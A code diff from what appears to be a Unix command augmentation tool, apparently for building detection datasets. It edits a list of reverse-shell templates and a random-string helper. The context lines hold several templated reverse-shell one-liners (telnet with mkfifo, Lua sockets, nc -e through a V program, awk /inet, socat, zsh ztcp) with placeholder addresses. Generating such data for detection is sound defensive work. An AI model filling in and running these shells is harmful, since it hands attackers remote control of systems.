@@ -41,7 +41,7 @@ REVERSE_SHELL_TEMPLATES = [
         #r"""socat PROTOCOL_TYPE:IP_ADDRESS:PORT_NUMBER EXEC:'NIX_SHELL',pty,stderr,setsid,sigint,sane""",
         r"""VARIABLE_NAME=$(mktemp -u);mkfifo $VARIABLE_NAME && telnet IP_ADDRESS PORT_NUMBER 0<$VARIABLE_NAME | NIX_SHELL 1>$VARIABLE_NAME""",
         #r"""zsh -c 'zmodload zsh/net/tcp && ztcp IP_ADDRESS PORT_NUMBER && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'""",
-        r"""lua -e "require('socket');require('os');t=socket.PROTOCOL_TYPE();t:connect('IP_ADDRESS','PORT_NUMBER');os.execute('NIX_SHELL -i <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER');""",
+        r'lua -e "require(\'socket\');require(\'os\');t=socket.PROTOCOL_TYPE();t:connect(\'IP_ADDRESS\',\'PORT_NUMBER\');os.execute(\'NIX_SHELL -i <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER\');"',
         #r"""lua5.1 -e 'local VARIABLE_NAME_1, VARIABLE_NAME_2 = "IP_ADDRESS", PORT_NUMBER local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(VARIABLE_NAME_1, VARIABLE_NAME_2); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'""",
         r"""echo 'import os' > FILE_PATH.v && echo 'fn main() { os.system("nc -e NIX_SHELL IP_ADDRESS PORT_NUMBER 0>&1") }' >> FILE_PATH.v && v run FILE_PATH.v && rm FILE_PATH.v""",
         r"""awk 'BEGIN {VARIABLE_NAME_1 = "/inet/PROTOCOL_TYPE/0/IP_ADDRESS/PORT_NUMBER"; while(FD_NUMBER) { do{ printf "shell>" |& VARIABLE_NAME_1; VARIABLE_NAME_1 |& getline VARIABLE_NAME_2; if(VARIABLE_NAME_2){ while ((VARIABLE_NAME_2 |& getline) > 0) print $0 |& VARIABLE_NAME_1; close(VARIABLE_NAME_2); } } while(VARIABLE_NAME_2 != "exit") close(VARIABLE_NAME_1); }}' /dev/null"""
@@ -83,7 +83,9 @@ class NixCommandAugmentation:
 
     @staticmethod
     def get_random_string(length: int = 10):
-        return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))
+        first_char = random.choice(string.ascii_lowercase)
+        rest = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length - 1))
+        return first_char + rest
 
     def get_random_filepaths(
         self,
@@ -287,7 +289,9 @@ class NixCommandAugmentationWithBaseline:
 
     @staticmethod
     def get_random_string(length: int = 10) -> str:
-        return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))
+        first_char = random.choice(string.ascii_lowercase)
+        rest = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length - 1))
+        return first_char + rest
 
     def get_random_filepaths(
             self, 
